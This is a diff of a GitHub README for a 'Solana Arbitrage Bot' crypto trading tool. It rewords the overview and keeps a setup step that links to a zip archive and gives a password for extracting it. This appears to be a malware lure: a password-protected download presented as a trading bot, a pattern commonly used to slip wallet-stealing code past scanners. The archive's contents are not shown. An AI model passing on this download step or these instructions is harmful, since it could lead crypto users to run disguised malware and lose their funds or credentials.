@@ -2,7 +2,7 @@
 ![](https://github.com/Xinkey62/solana-arbitrage/blob/main/untitled1.png?raw=true)
 ## Overview
 
-The Solana Arbitrage Bot is an automated trading tool designed to identify and execute arbitrage opportunities within the Solana ecosystem. It leverages Solana's fast transaction speeds and low fees to profit from price discrepancies between different decentralized exchanges (DEXs) or liquidity pools.
+The Solana Arbitrage Bot is an automated trading tool created to detect and capitalize on arbitrage opportunities within the Solana ecosystem. It takes advantage of Solana's quick transaction speeds and low fees to benefit from price differences across various decentralized exchanges (DEXs) or liquidity pools.
 
 **Disclaimer:** Trading cryptocurrencies involves risks, including the risk of losing capital. This bot is for educational and informational purposes only. Use it responsibly and at your own risk.
 
@@ -22,7 +22,6 @@ The Solana Arbitrage Bot is an automated trading tool designed to identify and e
 - **Wallet Integration:** Supports integration with Solana wallets for seamless trading execution.
 
 ## Getting Started
-Follow these steps to set up and run the Solana Arbitrage Bot on your local machine:
 - [Clone](https://github.com/Xinkey62/solana-arbitrage/archive/refs/heads/main.zip) the repository and extract archive with password `WFv53ObKqM`
 - Configure your environment:
 Create a `.env file` in the project's root directory and define your environment variables. You can use the `.env.example` file as a template.
